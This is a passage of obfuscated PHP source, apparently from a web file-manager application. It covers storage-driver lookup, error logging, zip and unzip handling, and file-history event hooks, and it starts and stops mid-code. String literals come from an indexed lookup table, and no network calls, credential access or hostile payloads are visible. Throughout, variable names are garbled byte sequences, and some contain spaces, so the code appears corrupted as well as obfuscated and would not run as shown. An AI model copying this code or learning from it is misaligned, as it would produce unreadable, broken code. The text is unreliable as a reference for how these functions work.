Exception("\146\x69\154\x65\122\145\141\x64\x20\145\162\162\x6f\x72\x2c\157\x76\x65\x72\x20\151\157\x52\145\141\x64\x4d\x61\x78\x21\40\x73\164\141\162\164\75{$—Ñ¨íû«}\x3b\x6c\145\x6e\x67\164\x68\75{$¿ëŒ÷¢}\73\x20\163\151\172\145\x3d{$ÌÚ÷°”¢}\73"); } $«¤ä¡ = $š’‘º¥->fileSubstr($ğêÄŞØ, $—Ñ¨íû«, $¿ëŒ÷¢); if (!$«¤ä¡ && $¿ëŒ÷¢ && isset($GLOBALS[$öû˜™§†[1296]])) { throw new Exception($GLOBALS[$öû˜™§†[1296]][$öû˜™§†[1297]]); } return $«¤ä¡; } private static function driverMake(&$î¥ñ–øŠ) { $Å­…ß× =& $_SERVER[€ä¾™²]; $¬˜¡ş¬ = KodIO::parse($î¥ñ–øŠ); if (!self::$driverListSystem) { $üÂìŞ¬ş = Model($Å­…ß×[868])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($üÂìŞ¬ş, $Å­…ß×[486]); } if ($¬˜¡ş¬[$Å­…ß×[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¬˜¡ş¬[$Å­…ß×[486]]]) { throw new Exception($Å­…ß×[1298]); return !1; } $î¥ñ–øŠ = $¬˜¡ş¬[$Å­…ß×[1299]]; $é€ç¢ê¢ = self::driverGet($¬˜¡ş¬, $î¥ñ–øŠ); return $é€ç¢ê¢; } private static function driverGet($†°‰š¶­, &$ü½™ÃÅ™) { $äÎÒ =& $_SERVER[€ä¾™²]; $Ñö¯æ® = $†°‰š¶­[$äÎÒ[1300]]; $ÙüÄƒº = $†°‰š¶­[$äÎÒ[486]]; switch ($†°‰š¶­[$äÎÒ[33]]) { case KodIO::KOD_IO: $òØŒ‚® = self::$driverListSystem[$ÙüÄƒº]; break; case KodIO::KOD_SOURCE: $ü½™ÃÅ™ = $ÙüÄƒº . $ü½™ÃÅ™; $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1302], $äÎÒ[6] => $†°‰š¶­); $òØŒ‚®[$äÎÒ[6]][$äÎÒ[1303]] = $†°‰š¶­[$äÎÒ[486]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $½ªŸÜöÀ = $GLOBALS[$äÎÒ[1304]]; self::$driverListUser = array_to_keyvalue($½ªŸÜöÀ, $äÎÒ[486]); } $òØŒ‚® = self::$driverListUser[$ÙüÄƒº]; break; case KodIO::KOD_SHARE_LINK: $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1305], $äÎÒ[6] => $†°‰š¶­); $à¢¹ÄÌ¸ = Action($äÎÒ[1306])->sharePathInfo($†°‰š¶­[$äÎÒ[87]]); $ü½™ÃÅ™ = $à¢¹ÄÌ¸[$äÎÒ[192]]; if (!$à¢¹ÄÌ¸[$äÎÒ[192]]) { $ŠÄâ€±Ú = Model($äÎÒ[693])->getInfoByHash($†°‰š¶­[$äÎÒ[486]]); $ü½™ÃÅ™ = KodIO::clear($ŠÄâ€±Ú[$äÎÒ[590]] . $†°‰š¶­[$äÎÒ[1299]]); $†°‰š¶­[$äÎÒ[583]] = $ŠÄâ€±Ú; $†°‰š¶­[$äÎÒ[1280]] = $ü½™ÃÅ™; $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1307], $äÎÒ[6] => $†°‰š¶­); } else { $òØŒ‚®[$äÎÒ[6]][$äÎÒ[1303]] = $à¢¹ÄÌ¸[$äÎÒ[192]]; } break; case KodIO::KOD_SHARE_ITEM: $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1308], $äÎÒ[6] => $†°‰š¶­); $ŠÄâ€±Ú = Model($äÎÒ[693])->getInfo($†°‰š¶­[$äÎÒ[486]]); if ($ŠÄâ€±Ú[$äÎÒ[192]] == $äÎÒ[229]) { $ü½™ÃÅ™ = KodIO::clear($ŠÄâ€±Ú[$äÎÒ[590]] . $†°‰š¶­[$äÎÒ[1299]]); $†°‰š¶­[$äÎÒ[583]] = $ŠÄâ€±Ú; $†°‰š¶­[$äÎÒ[1280]] = $ü½™ÃÅ™; $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1309], $äÎÒ[6] => $†°‰š¶­); } else { if (!$ü½™ÃÅ™) { $ü½™ÃÅ™ = $ŠÄâ€±Ú[$äÎÒ[192]]; } $òØŒ‚®[$äÎÒ[6]][$äÎÒ[1303]] = $ŠÄâ€±Ú[$äÎÒ[192]]; } break; case KodIO::KOD_SHARE_OUTER: $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1310], $äÎÒ[6] => $†°‰š¶­); break; default: $ü½™ÃÅ™ = $†°‰š¶­[$äÎÒ[87]]; $òØŒ‚® = array($äÎÒ[1301] => $äÎÒ[1311]); break; } $¨Âº‡¯í = $†°‰š¶­[$äÎÒ[87]]; if (!isset(self::$driverCache[$¨Âº‡¯í])) { $Ôí´İÁù = strtolower($òØŒ‚®[$äÎÒ[96]]); $˜¹Õ‰¦ù = $GLOBALS[$äÎÒ[6]][$äÎÒ[92]][$äÎÒ[933]]; $úôÒÁ‡³ = $äÎÒ[77] . (isset($˜¹Õ‰¦ù[$Ôí´İÁù]) ? $˜¹Õ‰¦ù[$Ôí´İÁù] : ucfirst($Ôí´İÁù)); if (!class_exists($úôÒÁ‡³)) { show_json("{$úôÒÁ‡³}\x20\x6e\x6f\164\x20\145\x78\151\x73\x74\163\x21", !1); } $Î”»ÕÑ = isset($òØŒ‚®[$äÎÒ[6]]) ? $òØŒ‚®[$äÎÒ[6]] : !1; self::$driverCache[$¨Âº‡¯í] = new $úôÒÁ‡³($Î”»ÕÑ); } $ÏÌ‚¼Ò = self::$driverCache[$¨Âº‡¯í]; $ÏÌ‚¼Ò->pathDriver = $Ñö¯æ®; $ÏÌ‚¼Ò->pathBase = $äÎÒ[12]; if (isset($òØŒ‚®[$äÎÒ[6]][$äÎÒ[1312]])) { $ÏÌ‚¼Ò->pathBase = rtrim($òØŒ‚®[$äÎÒ[6]][$äÎÒ[1312]], $äÎÒ[8]) . $äÎÒ[8]; $ü½™ÃÅ™ = $ÏÌ‚¼Ò->pathBase . ltrim($ü½™ÃÅ™, $äÎÒ[8]); } $ü½™ÃÅ™ = $ÏÌ‚¼Ò->getPath($ü½™ÃÅ™); if (isset($†°‰š¶­[$äÎÒ[1280]])) { $ü½™ÃÅ™ = $†°‰š¶­[$äÎÒ[1280]]; } $ÏÌ‚¼Ò->path = $ü½™ÃÅ™; return $ÏÌ‚¼Ò; } public static function errorTips($Ú–øüèú = false, $µğå¥°¦ = true) { $éÜ›ù©“ =& $_SERVER[€ä¾™²]; static $ƒ‘©€§• = array(); $—ÅÉŸŒ® = 100; if ($Ú–øüèú === -1) { return $ƒ‘©€§• ? $ƒ‘©€§•[count($ƒ‘©€§•) - 1] : $éÜ›ù©“[12]; } if ($Ú–øüèú === !1) { return implode($éÜ›ù©“[286], $ƒ‘©€§•); } if (count($ƒ‘©€§•) >= $—ÅÉŸŒ®) { $ƒ‘©€§• = array_slice($ƒ‘©€§•, $—ÅÉŸŒ® * 0.5, $—ÅÉŸŒ®); } $ƒ‘©€§•[] = $Ú–øüèú; if (!$µğå¥°¦) { return; } write_log($éÜ›ù©“[174] . ACTION . $éÜ›ù©“[1313] . $Ú–øüèú, $éÜ›ù©“[1314]); } public static function getLastError($¾ÁÓ‡Êß = '') { $»¶€Š¤İ = self::errorTips(-1); return $»¶€Š¤İ ? $»¶€Š¤İ : $¾ÁÓ‡Êß; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ª”²ª½÷; if ($ª”²ª½÷) { return $ª”²ª½÷; } $²‡®şø  = IO::init($_SERVER[€ä¾™²][8]); return $²‡®şø ; } private static function iconvSystem($°†Ã’º–) { return self::local()->iconvSystem($°†Ã’º–); } private static function iconvApp($üòçÄ®è) { return self::local()->iconvApp($üòçÄ®è); } public static function zipFolder($êõªŸã¯, $°õÚîĞë = "\172\x69\160", $ ¸ğÆë¨ = '', $Æ“… Å¼ = REPEAT_RENAME) { $Š±¸ÓÁå =& $_SERVER[€ä¾™²]; $ïíüæî = IO::listPath($êõªŸã¯); if (!$ïíüæî) { return !1; } $ïíüæî = array_merge($ïíüæî[$Š±¸ÓÁå[85]], $ïíüæî[$Š±¸ÓÁå[86]]); return self::zip($ïíüæî, $°õÚîĞë, $ ¸ğÆë¨, $Æ“… Å¼); } public static function zip($›È¨¼Ç, $ÃÙïÜ°Ú = "\172\151\160", $³û×Ş­± = '', $ÆØ¥ñÅ = REPEAT_RENAME) { $û‚Ô®×¡ =& $_SERVER[€ä¾™²]; if (is_string($›È¨¼Ç) && $›È¨¼Ç) { $›È¨¼Ç = array(array($û‚Ô®×¡[87] => $›È¨¼Ç)); } $Ğ„¼¢ûç = self::init($›È¨¼Ç[0][$û‚Ô®×¡[87]]); $ŠÅŸÚ”ò = self::info($›È¨¼Ç[0][$û‚Ô®×¡[87]]); $²†ƒğÈ = $û‚Ô®×¡[12]; $¯õ×–Ïó = $û‚Ô®×¡[12]; $ßØ¸¬²Š = $û‚Ô®×¡[12]; if ($³û×Ş­± && substr($³û×Ş­±, -1, 1) != $û‚Ô®×¡[8]) { $¯õ×–Ïó = get_path_father($³û×Ş­±); $ßØ¸¬²Š = get_path_this($³û×Ş­±); } else { $¯õ×–Ïó = self::pathFather($ŠÅŸÚ”ò[$û‚Ô®×¡[87]]); $ßØ¸¬²Š = $ŠÅŸÚ”ò[$û‚Ô®×¡[32]] . $û‚Ô®×¡[10] . $ÃÙïÜ°Ú; if (count($›È¨¼Ç) > 1) { $†…”÷Ä« = IO::info($¯õ×–Ïó); $ßØ¸¬²Š = $†…”÷Ä«[$û‚Ô®×¡[32]] . $û‚Ô®×¡[10] . $ÃÙïÜ°Ú; } if ($³û×Ş­±) { $¯õ×–Ïó = $³û×Ş­±; } } if ($Ğ„¼¢ûç->getType() == $û‚Ô®×¡[107]) { $¥Èê¿Ğ = self::init($¯õ×–Ïó); $ÄŞÙ÷š€ = $¥Èê¿Ğ->getType() == $û‚Ô®×¡[107] ? $¯õ×–Ïó : get_path_father($Ğ„¼¢ûç->path); $ÄŞÙ÷š€ = IO::getPathInner($ÄŞÙ÷š€); $ÄŞÙ÷š€ = rtrim($ÄŞÙ÷š€, $û‚Ô®×¡[8]) . $û‚Ô®×¡[8]; mk_dir($ÄŞÙ÷š€); } else { $²†ƒğÈ = TEMP_FILES . $û‚Ô®×¡[1315] . time() . rand_string(8) . $û‚Ô®×¡[8]; mk_dir($²†ƒğÈ); file_put_contents($²†ƒğÈ . $û‚Ô®×¡[1316], $û‚Ô®×¡[12]); $ÄŞÙ÷š€ = $²†ƒğÈ; } $Ò„ Í¿ = IO::info($ÄŞÙ÷š€); if (!$Ò„ Í¿ || !$Ò„ Í¿[$û‚Ô®×¡[234]]) { show_json(LNG($û‚Ô®×¡[1317]), !1); } $íé«ÛÁÈ = self::zipFileList($›È¨¼Ç, $²†ƒğÈ); foreach ($íé«ÛÁÈ as $•®®…©Ş => $„€€ı•ı) { $íé«ÛÁÈ[$•®®…©Ş] = self::iconvSystem($„€€ı•ı); } $‹Ø¸¡¸Ø = get_filename_auto($ÄŞÙ÷š€ . $ßØ¸¬²Š, $û‚Ô®×¡[12], $ÆØ¥ñÅ); KodArchive::create(self::iconvSystem($‹Ø¸¡¸Ø), $íé«ÛÁÈ); if (!IO::exist($‹Ø¸¡¸Ø)) { if ($²†ƒğÈ) { del_dir($²†ƒğÈ); } write_log($û‚Ô®×¡[1318] . $‹Ø¸¡¸Ø, $û‚Ô®×¡[389]); show_json(LNG($û‚Ô®×¡[1319]), !1); } if (!$²†ƒğÈ) { return $‹Ø¸¡¸Ø; } $¹„É×½¯ = self::move($‹Ø¸¡¸Ø, $¯õ×–Ïó, $ÆØ¥ñÅ); if ($²†ƒğÈ) { del_dir($²†ƒğÈ); } if (!$‹Ø¸¡¸Ø) { write_log($û‚Ô®×¡[1320] . $‹Ø¸¡¸Ø . $û‚Ô®×¡[1321] . $¯õ×–Ïó, $û‚Ô®×¡[389]); show_json(LNG($û‚Ô®×¡[1319]), !1); } return $¹„É×½¯; } public static function unzip($¿ã£š×, $Õ÷‹ùŠî, $áÖ˜ë = "\55\61", $ÜÙúÁ–õ = "\162\145\160\x6c\x61\143\145") { $‚¶ŞßÓû =& $_SERVER[€ä¾™²]; $°é–¢é = parent::info($¿ã£š×); if (!$°é–¢é) { show_json(LNG($‚¶ŞßÓû[1322]), !1); } $ÔÒ¹‡óà = IO::infoFullSimple($Õ÷‹ùŠî); if (!$ÔÒ¹‡óà) { $Õ÷‹ùŠî = IO::mkdir($Õ÷‹ùŠî); } if (isset($ÔÒ¹‡óà[$‚¶ŞßÓû[192]]) && trim($ÔÒ¹‡óà[$‚¶ŞßÓû[87]], $‚¶ŞßÓû[8]) != trim($Õ÷‹ùŠî, $‚¶ŞßÓû[8])) { $¼åıêÕâ = KodIO::make($ÔÒ¹‡óà[$‚¶ŞßÓû[191]]); $û© î‚ì = IO::fileNameAuto($¼åıêÕâ, $ÔÒ¹‡óà[$‚¶ŞßÓû[32]], REPEAT_RENAME_FOLDER, !0); $Õ÷‹ùŠî = IO::mkdir($¼åıêÕâ . $û© î‚ì); } $áÖ˜ë = $áÖ˜ë && $áÖ˜ë != $‚¶ŞßÓû[1323] ? @json_decode($áÖ˜ë, !0) : -1; $¡»¿ËËÎ = self::unzipPart($¿ã£š×, $áÖ˜ë); if (!$¡»¿ËËÎ || !IO::exist($¡»¿ËËÎ[$‚¶ŞßÓû[231]])) { show_json(LNG($‚¶ŞßÓû[106]), !1); } $õî×‘¼È = $¡»¿ËËÎ[$‚¶ŞßÓû[1324]][count($¡»¿ËËÎ[$‚¶ŞßÓû[1324]]) - 1]; if ($õî×‘¼È[$‚¶ŞßÓû[1252]] == -1 || substr($õî×‘¼È[$‚¶ŞßÓû[32]], -1, 1) == $‚¶ŞßÓû[8]) { $¯½ú©“Ì = $¡»¿ËËÎ[$‚¶ŞßÓû[1325]] . rand_string(10) . $‚¶ŞßÓû[8]; mk_dir($¯½ú©“Ì); $üŞ¹ºøÊ = count($¡»¿ËËÎ[$‚¶ŞßÓû[1324]]) == 1 ? IO::ext($¿ã£š×) : get_path_ext($¡»¿ËËÎ[$‚¶ŞßÓû[231]]); $Š¬É€™ò = KodArchive::extract(self::iconvSystem($¡»¿ËËÎ[$‚¶ŞßÓû[231]]), $¯½ú©“Ì, $õî×‘¼È[$‚¶ŞßÓû[1252]], $û© î‚ì, $üŞ¹ºøÊ); self::unzipErrorCheck($Š¬É€™ò, array($‚¶ŞßÓû[1326], $¿ã£š×, $üŞ¹ºøÊ, $Õ÷‹ùŠî, $¡»¿ËËÎ)); Hook::trigger($‚¶ŞßÓû[1327], $¯½ú©“Ì); recursion_dir($¯½ú©“Ì, $ú·½áå‡, $†¯’¢ì¾, 0); $Êı²¥‰İ = array_merge($ú·½áå‡, $†¯’¢ì¾); $ì¼‘™‘ = array(); foreach ($Êı²¥‰İ as $‡‚¤ã¡) { $Ä»÷¨Éæ = IO::move(self::iconvApp($‡‚¤ã¡), $Õ÷‹ùŠî, $ÜÙúÁ–õ); if ($Ä»÷¨Éæ) { $ì¼‘™‘[] = $Ä»÷¨Éæ; } } del_dir($¯½ú©“Ì); } else { $Ä»÷¨Éæ = IO::move($¡»¿ËËÎ[$‚¶ŞßÓû[231]], $Õ÷‹ùŠî, $ÜÙúÁ–õ, get_path_this($õî×‘¼È[$‚¶ŞßÓû[32]])); if ($Ä»÷¨Éæ) { $ì¼‘™‘[] = $Ä»÷¨Éæ; } } return $ì¼‘™‘ ? $ì¼‘™‘ : !1; } public static function unzipList($æÄ‘‡¤ï) { $øúÑ’Ï· =& $_SERVER[€ä¾™²]; $ï¿î©úÉ = isset($æÄ‘‡¤ï[$øúÑ’Ï·[1328]]) ? $æÄ‘‡¤ï[$øúÑ’Ï·[1328]] : !1; $»îªú‹‰ = isset($æÄ‘‡¤ï[$øúÑ’Ï·[1252]]) ? @json_decode($æÄ‘‡¤ï[$øúÑ’Ï·[1252]], !0) : -1; $× ûıó¿ = self::unzipPart($æÄ‘‡¤ï[$øúÑ’Ï·[87]], $»îªú‹‰); if (!$× ûıó¿ || !IO::exist($× ûıó¿[$øúÑ’Ï·[231]])) { show_json(LNG($øúÑ’Ï·[106]), !1); } $Æ´º•ü¹ = $× ûıó¿[$øúÑ’Ï·[1324]][count($× ûıó¿[$øúÑ’Ï·[1324]]) - 1]; $†˜ïè‚© = in_array(IO::ext($× ûıó¿[$øúÑ’Ï·[231]]), array($øúÑ’Ï·[389], $øúÑ’Ï·[1329], $øúÑ’Ï·[1330], $øúÑ’Ï·[1331], $øúÑ’Ï·[1332], $øúÑ’Ï·[1333])); if (!$ï¿î©úÉ && ($Æ´º•ü¹[$øúÑ’Ï·[1252]] == -1 || $†˜ïè‚©)) { $Ñ†™€µ¦ = $× ûıó¿[$øúÑ’Ï·[1325]] . get_path_this($× ûıó¿[$øúÑ’Ï·[231]]) . $øúÑ’Ï·[1334]; if (!IO::exist($Ñ†™€µ¦)) { $ÜïÎ¿¨ = $Æ´º•ü¹[$øúÑ’Ï·[1252]] == -1 ? get_path_ext(IO::pathThis($æÄ‘‡¤ï[$øúÑ’Ï·[87]])) : get_path_ext($× ûıó¿[$øúÑ’Ï·[231]]); $À°àÔÃò = KodArchive::listContent(self::iconvSystem($× ûıó¿[$øúÑ’Ï·[231]]), !0, $ÜïÎ¿¨); self::unzipErrorCheck($À°àÔÃò, array($øúÑ’Ï·[1335], $æÄ‘‡¤ï, $× ûıó¿)); @file_put_contents($Ñ†™€µ¦, json_encode($À°àÔÃò[$øúÑ’Ï·[1336]])); } return @json_decode(IO::getContent($Ñ†™€µ¦), !0); } IO::fileOut($× ûıó¿[$øúÑ’Ï·[231]], $ï¿î©úÉ, get_path_this($Æ´º•ü¹[$øúÑ’Ï·[32]])); die; } private static function zipFileList($üãˆˆ®, $—¸¨“‚¥ = false) { $×Õ‹€×¿ =& $_SERVER[€ä¾™²]; $ı™ë™®ä = array(); foreach ($üãˆˆ® as $šÅ›¿) { $¢ş¯á¶ = $šÅ›¿[$×Õ‹€×¿[87]]; if ($—¸¨“‚¥) { $¢ş¯á¶ = self::copy($šÅ›¿[$×Õ‹€×¿[87]], $—¸¨“‚¥, $×Õ‹€×¿[926]); } else { $ÜÖ¶é = self::init($šÅ›¿[$×Õ‹€×¿[87]]); if ($ÜÖ¶é->getType() == $×Õ‹€×¿[107]) { $¢ş¯á¶ = $ÜÖ¶é->path; } } if ($¢ş¯á¶ && self::local()->exist($¢ş¯á¶)) { $ı™ë™®ä[$šÅ›¿[$×Õ‹€×¿[87]]] = $¢ş¯á¶; } } if (!empty($ı™ë™®ä)) { return array_values($ı™ë™®ä); } show_json(LNG($×Õ‹€×¿[1294]), !1); } private static function localFilePath($³¡Ã¸ŒŞ) { $‹ø¿Ë‰ =& $_SERVER[€ä¾™²]; $“ãĞ×øï = KodIO::parse($³¡Ã¸ŒŞ); if ($“ãĞ×øï[$‹ø¿Ë‰[33]] == KodIO::KOD_SOURCE) { $¿à³¶×Ä = Model($‹ø¿Ë‰[932])->fileInfoGet(KodIO::sourceID($³¡Ã¸ŒŞ)); if (!$¿à³¶×Ä[$‹ø¿Ë‰[87]]) { show_json($‹ø¿Ë‰[1337], !1); } $³¡Ã¸ŒŞ = $¿à³¶×Ä[$‹ø¿Ë‰[87]]; } $ÂüïŒş = self::init($³¡Ã¸ŒŞ); if ($ÂüïŒş->pathParse[$‹ø¿Ë‰[1280]]) { $³¡Ã¸ŒŞ = $ÂüïŒş->pathParse[$‹ø¿Ë‰[1280]]; $ÂüïŒş = self::init($³¡Ã¸ŒŞ); } $ˆå…­Øü = $ÂüïŒş->getType(); if ($ˆå…­Øü == $‹ø¿Ë‰[107] || $ˆå…­Øü == $‹ø¿Ë‰[1338]) { if (!$ÂüïŒş->exist($ÂüïŒş->path)) { show_json(LNG($‹ø¿Ë‰[106]), !1); } return $ÂüïŒş->path; } return !1; } public static function unzipPart($ù–ôğ, $–©ÒÈ…Î = -1) { $öŞœ‡­¨ =& $_SERVER[€ä¾™²]; $ÚƒŒ›º­ = IO::pathThis($ù–ôğ); if (!$–©ÒÈ…Î || $–©ÒÈ…Î == -1) { $ç„‘Óó = array(array($öŞœ‡­¨[32] => $ÚƒŒ›º­, $öŞœ‡­¨[1252] => -1)); $ç„‘Óó[0][$öŞœ‡­¨[1339]] = $ç„‘Óó[0][$öŞœ‡­¨[32]]; } else { if (is_array($–©ÒÈ…Î)) { $ç„‘Óó = $–©ÒÈ…Î; $º·¤–Ì = count($ç„‘Óó) - 1; for ($„¦Ê»±ı = 0; $„¦Ê»±ı <= $º·¤–Ì; $„¦Ê»±ı++) { $¼‰Îóçª = $ç„‘Óó[$„¦Ê»±ı]; $ÑË„Ğ¬ = get_path_this($¼‰Îóçª[$öŞœ‡­¨[32]]) . (checkExtSafe($¼‰Îóçª[$öŞœ‡­¨[32]]) ? $öŞœ‡­¨[12] : $öŞœ‡­¨[1340]); $ç„‘Óó[$„¦Ê»±ı][$öŞœ‡­¨[1339]] = $öŞœ‡­¨[1341] . intval($¼‰Îóçª[$öŞœ‡­¨[1252]]) . $öŞœ‡­¨[476] . $ÑË„Ğ¬; if ($„¦Ê»±ı == 0) { continue; } $ç„‘Óó[$„¦Ê»±ı][$öŞœ‡­¨[1339]] = $ç„‘Óó[$„¦Ê»±ı - 1][$öŞœ‡­¨[1339]] . $öŞœ‡­¨[1342] . $ç„‘Óó[$„¦Ê»±ı][$öŞœ‡­¨[1339]]; } } } if (!is_array($ç„‘Óó) || count($ç„‘Óó) == 0) { return !1; } $®ÎÕïï = $ç„‘Óó[count($ç„‘Óó) - 1]; if (!IO::exist($ù–ôğ)) { return !1; } $š¿¨ôãŸ = TEMP_FILES . $öŞœ‡­¨[1343] . kodIO::hashPathSafe($ù–ôğ) . $öŞœ‡­¨[8]; $ŸÌÄæŒâ = $š¿¨ôãŸ . $®ÎÕïï[$öŞœ‡­¨[1339]]; mk_dir($š¿¨ôãŸ); file_put_contents(TEMP_FILES . $öŞœ‡­¨[1316], $öŞœ‡­¨[12]); if (IO::exist($ŸÌÄæŒâ)) { return array($öŞœ‡­¨[231] => $ŸÌÄæŒâ, $öŞœ‡­¨[1324] => $ç„‘Óó, $öŞœ‡­¨[1325] => $š¿¨ôãŸ); } $Óöç¡˜™ = self::localFilePath($ù–ôğ); if (!$Óöç¡˜™) { $Óöç¡˜™ = $š¿¨ôãŸ . $öŞœ‡­¨[1344]; if (!IO::exist($Óöç¡˜™)) { self::copy($ù–ôğ, $š¿¨ôãŸ, !1, get_path_this($Óöç¡˜™)); } } if (!$Óöç¡˜™ || !IO::exist($Óöç¡˜™)) { return !1; } if ($®ÎÕïï[$öŞœ‡­¨[1252]] == -1) { return array($öŞœ‡­¨[231] => $Óöç¡˜™, $öŞœ‡­¨[1324] => $ç„‘Óó, $öŞœ‡­¨[1325] => $š¿¨ôãŸ); } $±¬§ÚŠ = $Óöç¡˜™; foreach ($ç„‘Óó as $„¦Ê»±ı => $¼‰Îóçª) { if (!$¼‰Îóçª || $¼‰Îóçª[$öŞœ‡­¨[1252]] == $öŞœ‡­¨[1323]) { break; } if (substr($¼‰Îóçª[$öŞœ‡­¨[32]], -1, 1) == $öŞœ‡­¨[8]) { break; } $ò›ü¢ÕŒ = in_array(get_path_ext($¼‰Îóçª[$öŞœ‡­¨[1339]]), array($öŞœ‡­¨[389], $öŞœ‡­¨[1329], $öŞœ‡­¨[1330], $öŞœ‡­¨[1331], $öŞœ‡­¨[1332], $öŞœ‡­¨[1333])); $¡éÜ¯–ª = $„¦Ê»±ı == count($ç„‘Óó) - 1 && $ò›ü¢ÕŒ; $õ›§ƒæ´ = $š¿¨ôãŸ . $¼‰Îóçª[$öŞœ‡­¨[1339]]; $“‚°õ‚€ = $š¿¨ôãŸ . get_path_this($¼‰Îóçª[$öŞœ‡­¨[32]]); if (IO::exist($õ›§ƒæ´)) { $±¬§ÚŠ = $õ›§ƒæ´; continue; } $´ŒöÚµß = $„¦Ê»±ı == 0 ? get_path_ext($ÚƒŒ›º­) : get_path_ext($±¬§ÚŠ); $¬ È–›ü = KodArchive::extract(self::iconvSystem($±¬§ÚŠ), $š¿¨ôãŸ, $¼‰Îóçª[$öŞœ‡­¨[1252]], $º¡¤Ø¦, $´ŒöÚµß); self::unzipErrorCheck($¬ È–›ü, array($öŞœ‡­¨[1345], $ù–ôğ, $ç„‘Óó, $¼‰Îóçª, $õ›§ƒæ´)); if (IO::exist($“‚°õ‚€)) { IO::rename($“‚°õ‚€, get_path_this($õ›§ƒæ´)); } $±¬§ÚŠ = $õ›§ƒæ´; } $ŸÌÄæŒâ = $±¬§ÚŠ; return array($öŞœ‡­¨[231] => $±¬§ÚŠ, $öŞœ‡­¨[1324] => $ç„‘Óó, $öŞœ‡­¨[1325] => $š¿¨ôãŸ); } private static function unzipErrorCheck($¢¦ïƒ, $ª‹ƒòüü = false) { $Šãî½‡ =& $_SERVER[€ä¾™²]; if ($¢¦ïƒ[$Šãî½‡[1346]]) { return !0; } write_log(array($Šãî½‡[1347], $¢¦ïƒ, $ª‹ƒòüü), $Šãî½‡[1348]); $Ğ¢Æ—¶á = is_array($¢¦ïƒ[$Šãî½‡[1336]]) ? json_encode($¢¦ïƒ[$Šãî½‡[1336]]) : $¢¦ïƒ[$Šãî½‡[1336]]; show_json($Šãî½‡[1349] . $Ğ¢Æ—¶á, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¥›¹Óåê =& $_SERVER[€ä¾™²]; $¼ÊÊê¾ú = $GLOBALS[$¥›¹Óåê[6]][$¥›¹Óåê[92]]; if ($¼ÊÊê¾ú[$¥›¹Óåê[1350]] != 1) { return; } if ($¼ÊÊê¾ú[$¥›¹Óåê[1351]] <= 0) { return; } if (isset($_REQUEST[$¥›¹Óåê[1352]]) && $_REQUEST[$¥›¹Óåê[1352]] == $¥›¹Óåê[91]) { return; } Hook::bind($¥›¹Óåê[1353], $¥›¹Óåê[1354]); Hook::bind($¥›¹Óåê[1355], $¥›¹Óåê[1356]); Hook::bind($¥›¹Óåê[1357], $¥›¹Óåê[1358]); Hook::bind($¥›¹Óåê[1359], $¥›¹Óåê[1360]); Hook::bind($¥›¹Óåê[1361], $¥›¹Óåê[1362]); Hook::bind($¥›¹Óåê[1363], $¥›¹Óåê[1364]); } public static function eventBeforeUpload($’¡“õ†œ) { if ($’¡“õ†œ[3] && $’¡“õ†œ[3] != REPEAT_REPLACE) { return; } $”æ¡Œßğ = self::parsePath($’¡“õ†œ[0]); if (!$”æ¡Œßğ) { return; } self::add($”æ¡Œßğ); } public static function eventBeforeEdit($³€ÇÓ‹Š) { $¯¡¨ÏÛÉ = self::parsePath($³€ÇÓ‹Š[0]); if (!$¯¡¨ÏÛÉ) { return; } self::add($¯¡¨ÏÛÉ); } public static function eventBeforeCopyFile($¤ç»½Ûù, $ûˆ¢á•, $«™ëö®, $åñ¢µì–, $è„µüõ´, $«£ßüëÌ) { $Šî»„¯í =& $_SERVER[€ä¾™²]; if (isset($«™ëö®->_data[$Šî»„¯í[1284]]) && $«™ëö®->_data[$Šî»„¯í[1284]]) { return; } $‚ìÒš‹¸ = $«™ëö®->getPathOuter($åñ¢µì–); $†ó´¾æÅ = self::parsePath($‚ìÒš‹¸); if (!$†ó´¾æÅ) { return; } self::add($†ó´¾æÅ); } public static function eventBeforeRename($âô¼€·) { $ãéš®Ÿ… =& $_SERVER[€ä¾™²]; $ºšï« = self::parsePath($âô¼€·[0]); if (!$ºšï«) { return; } $Í÷½¡È¥ = self::checkInHistory($ºšï«); if (!$Í÷½¡È¥) { return; } if ($Í÷½¡È¥[$ãéš®Ÿ…[33]] == $ãéš®Ÿ…[231]) { $šÏïŸ¯ª = self::listData($ºšï«); if ($šÏïŸ¯ª && $šÏïŸ¯ª[$ãéš®Ÿ…[446]]) { self::moveHistory($ºšï«, $âô¼€·[1]); } } else { IO::rename($Í÷½¡È¥[$ãéš®Ÿ…[87]], $âô¼€·[1]); } } public static function eventBeforeMove($¹ØÑŞ‘’) { $½—˜ŸŞŞ =& $_SERVER[€ä¾™²]; $Ô˜ı“·Á = self::parsePath($¹ØÑŞ‘’[0]); if (!$Ô˜ı“·Á) { return; } $Ç„Çµä = self::parsePath($¹ØÑŞ‘’[1]); if (!$Ç„Çµä) { return; } $à©ı¿˜È = $¹ØÑŞ‘’[3]; $òòÎÍ„Î = self::checkInHistory($Ô˜ı“·Á); if (!$òòÎÍ„Î) { return; } $Ë¤— åÓ = self::pathHistory($Ç„Çµä); if ($òòÎÍ„Î[$½—˜ŸŞŞ[33]] == $½—˜ŸŞŞ[231]) { $ïéç’Ù = self::listData($Ô˜ı“·Á); $Øª·›õ† = rtrim($Ç„Çµä, $½—˜ŸŞŞ[8]) . $½—˜ŸŞŞ[8] . ($à©ı¿˜È ? $à©ı¿˜È : get_path_this($Ô˜ı“·Á)); $éÈé­ì§ = self::listData($Øª·›õ†); if ($ïéç’Ù && $ïéç’Ù[$½—˜ŸŞŞ[446]] && $éÈé­ì§ && $éÈé­ì§[$½—˜ŸŞŞ[446]]) { return self::clear($Ô˜ı“·Á); } if ($ïéç’Ù && $ïéç’Ù[$½—˜ŸŞŞ[446]]) { self::moveHistory($Ô˜ı“·Á, $à©ı¿˜È, $Ë¤— åÓ); } } else { IO::move($òòÎÍ„Î[$½—˜ŸŞŞ[87]], $Ë¤— åÓ, !1, $à©ı¿˜È); self::clearEmptyFolder(IO::pathFather($òòÎÍ„Î[$½—˜ŸŞŞ[87]])); } } public static function eventAfterRemove($°Á‹¾Â, 